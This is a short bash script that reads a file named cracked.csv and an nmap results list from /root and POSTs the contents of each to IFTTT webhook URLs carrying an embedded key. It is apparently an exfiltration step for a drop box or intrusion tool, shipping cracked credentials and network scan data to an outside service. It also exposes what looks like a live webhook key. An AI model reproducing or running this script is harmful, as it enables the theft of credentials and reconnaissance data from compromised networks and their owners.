#!/bin/bash

crackedcontent=$(cat /root/cracked.csv)
curl --data “value1=$crackedcontent” https://maker.ifttt.com/trigger/updatemail/with/key/bJSN_vb_uw0z2M4pfM72yL

nmaplist=$(cat /root/nmaplist)
curl --data “value1=$nmaplist” https://maker.ifttt.com/trigger/nmap/with/key/bJSN_vb_uw0z2M4pfM72yL
